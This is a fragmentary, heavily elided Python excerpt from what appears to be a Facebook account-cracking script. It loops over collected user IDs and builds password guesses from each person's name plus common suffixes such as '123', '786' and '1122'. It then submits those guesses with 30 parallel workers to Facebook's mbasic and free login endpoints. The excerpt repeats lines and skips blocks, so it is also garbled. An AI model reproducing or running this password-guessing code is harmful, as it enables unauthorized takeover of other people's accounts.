                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"123", xz[0]+"12345"]
                            pwx = [firstl+' '+lastl, xz[0]+"123", xz[0]+"12345"]
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"1122", xz[0]+xz[1], xz[0]+"786"]
                        else:
                            pwx = [name, xz[0]+"1122", xz[0]+xz[1], xz[0]+"786"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        lasts = last.title()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl,firstl+lastl, first+' '+lasts, first+"1122"]
                        else:
                            pwx = [firstl+' '+lastl,firstl+lastl, first+' '+lasts, first+"786"]
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        ...
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1], xz[0]+xz[1]+"1234", xz[0]+xz[1]+"12345"]
                        else:
                            pwx = [name, xz[0]+xz[1], xz[0]+xz[1]+"1234", xz[0]+xz[1]+"12345"]
                        ssbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: 
                    try:
                        ...
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[1]+"123", xz[1]+"12345",xz[1]+"1122", xz[1]+"786"]
                        else:
                            pwx = [xz[1]+"123", xz[1]+"12345",xz[1]+"1122", xz[1]+"786"]
                        ssbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl, xz[0]+"2020", xz[0]+"2021"]
                        else:
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"2021", xz[0]+"2022"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl,firstl+lastl, first+"1122", first+"12345", first+"786"]
